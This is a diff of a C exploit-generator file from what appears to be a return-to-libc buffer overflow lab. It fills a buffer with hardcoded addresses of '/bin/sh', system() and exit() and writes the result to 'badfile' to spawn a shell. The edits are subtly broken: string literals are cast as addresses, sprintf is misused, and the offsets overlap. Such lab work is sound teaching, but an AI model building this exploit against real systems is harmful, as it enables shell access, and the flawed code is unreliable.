@@ -15,17 +15,22 @@ void main(int argc, char **argv)
 
 	/* TODO: Fill initial buffer values. You need to make
 	   buffer values non-zero so that string copy overflows */
-	
+	//int i;
+	//for(i = 0; i < sizeof(buffer); i++){
+	//	*(long*) &buffer[i] = "A";
+	//}
 
 
 	/* TODO: Set the buffer at locations X, Y, and Z. The order 
 	   of the following three statements does not imply the
 	   order of X, Y, and Z. Actually, we intentionally 
 	   scrambled the order. */
+	//char* y = sprintf("%p", system); 
+	//char* z = sprintf("%p", exit); 
 	
-	*(long *) &buffer[X] = 0; // address of "/bin/sh"
-	*(long *) &buffer[Y] = 0; // address of system()
-	*(long *) &buffer[Z] = 0; // address of exit()
+	*(long *) &buffer[0] = "0xbfffffeb"; // address of "/bin/sh"
+	*(long *) &buffer[1] = "0xb7e5f430"; // address of system() to return address
+	*(long *) &buffer[2] = "0xb7e52fb0"; // address of exit()
 
 	/* Save the contents to the file "badfile" */
 	badfile = fopen("./badfile", "w");
